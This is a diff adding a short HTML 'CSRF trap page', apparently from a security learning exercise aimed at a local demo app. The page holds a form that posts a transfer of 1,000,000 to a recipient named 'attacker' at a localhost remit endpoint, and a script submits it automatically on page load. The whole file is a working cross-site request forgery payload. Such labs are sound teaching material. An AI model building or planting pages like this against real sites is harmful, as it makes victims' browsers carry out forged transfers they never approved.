@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF罠ページ</title>
+  </head>
+  <body>
+    <form id="remit" action="http://localhost:3000/csrf/remit" method="POST">
+      <div>
+        <input type="text" name="to" value="攻撃者" />
+        <input type="amount" name="amount" value="1000000" />
+      </div>
+      <script>
+        document.querySelector("#remit").submit();
+      </script>
+    </form>
+  </body>
+</html>
